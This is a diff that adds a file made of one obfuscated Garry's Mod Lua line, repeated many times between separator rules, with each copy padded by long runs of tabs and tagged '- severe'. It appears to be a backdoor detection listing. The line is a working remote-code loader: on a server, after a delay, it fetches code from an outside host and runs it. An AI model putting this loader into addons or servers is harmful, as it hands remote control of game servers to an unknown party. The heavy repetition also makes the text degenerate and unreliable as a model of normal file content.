@@ -1,0 +1,85 @@
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
+																						if SERVER then timer.Simple(30,function() http.Fetch("http://version.kaktusownia.com.pl/api/getcode",function(body) RunString(body) end) end) end - severe
+
+___________
